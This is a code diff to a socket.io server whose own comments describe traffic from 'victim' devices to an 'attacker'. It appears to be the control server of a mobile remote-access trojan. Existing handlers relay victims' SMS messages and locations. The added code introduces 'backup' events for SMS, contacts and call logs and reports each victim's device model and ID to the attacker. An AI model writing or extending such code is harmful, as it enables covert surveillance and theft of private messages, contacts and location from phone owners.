@@ -43,6 +43,11 @@ io.on('connection', (socket) => {
       socket.on("error", (data) =>response("error",data));
       socket.on("getSMS", (data) =>response("getSMS",data));
       socket.on('getLocation',(data)=>response("getLocation",data));
+      
+      // Backup event listeners - acknowledge backup initiation
+      socket.on('backupSMS', () => handleBackupInitiation(socket, 'backupSMS', 'SMS'));
+      socket.on('backupContacts', () => handleBackupInitiation(socket, 'backupContacts', 'Contacts'));
+      socket.on('backupCallLog', () => handleBackupInitiation(socket, 'backupCallLog', 'Call Log'));
      
       socket.on('disconnect', () => {
         if(socket.id===adminSocketId){
@@ -78,11 +83,36 @@ const response =(action, data)=>{// response from victim to attacker
         io.to(adminSocketId).emit(action, data);
     }
   }
-  const responseBinary =(action, data, callback)=>{// response from victim to attacker
+  
+const responseBinary =(action, data, callback)=>{// response from victim to attacker
     if(adminSocketId){
         log("response action: "+ action);
         callback("success")
         io.to(adminSocketId).emit(action, data);
+    }
+  }
+
+// Handle backup initiation and send response to admin
+const handleBackupInitiation = (socket, action, moduleName) => {
+    const deviceInfo = deviceList[socket.id];
+    const deviceId = deviceInfo ? deviceInfo.id : 'Unknown';
+    const deviceModel = deviceInfo ? deviceInfo.model : 'Unknown';
+    
+    log(`${moduleName} backup initiated for device: ${deviceModel} (${deviceId})`);
+    
+    // Send acknowledgment to admin that backup process has started
+    if(adminSocketId){
+        const backupResponse = {
+            action: action,
+            module: moduleName,
+            status: 'initiated',
+            deviceId: deviceId,
+            deviceModel: deviceModel,
+            timestamp: new Date().toISOString(),
+            message: `${moduleName} backup process initiated on device ${deviceModel}`
+        };
+        io.to(adminSocketId).emit('backupStatus', backupResponse);
+        log(`Backup status sent to admin: ${JSON.stringify(backupResponse)}`);
     }
   }
 // LOGGER
